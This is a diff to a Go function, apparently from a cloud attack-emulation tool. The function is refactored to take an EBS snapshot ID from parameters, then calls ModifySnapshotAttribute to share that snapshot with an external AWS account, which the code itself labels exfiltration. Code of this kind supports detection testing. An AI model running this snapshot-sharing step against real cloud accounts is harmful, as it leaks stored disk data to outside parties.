@@ -32,19 +32,17 @@ Detonation: Calls ModifySnapshotAttribute to share the snapshot.
 	})
 }
 
-func detonate(terraformOutputs map[string]string) error {
+func detonate(params map[string]string) error {
 	ec2Client := ec2.NewFromConfig(providers.GetAWSProvider())
 
 	// Find the snapshot to exfiltrate
-	ourSnapshotId, err := findSnapshotId(ec2Client)
-	if err != nil {
-		return err
-	}
+	//ourSnapshotId, err := findSnapshotId(ec2Client)
+	ourSnapshotId := params["snapshot_id"]
 
 	// Exfiltrate it
 	log.Println("Sharing the volume snapshot with an external AWS account ID...")
 
-	_, err = ec2Client.ModifySnapshotAttribute(context.TODO(), &ec2.ModifySnapshotAttributeInput{
+	_, err := ec2Client.ModifySnapshotAttribute(context.TODO(), &ec2.ModifySnapshotAttributeInput{
 		SnapshotId: aws.String(ourSnapshotId),
 		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
 		CreateVolumePermission: &types.CreateVolumePermissionModifications{
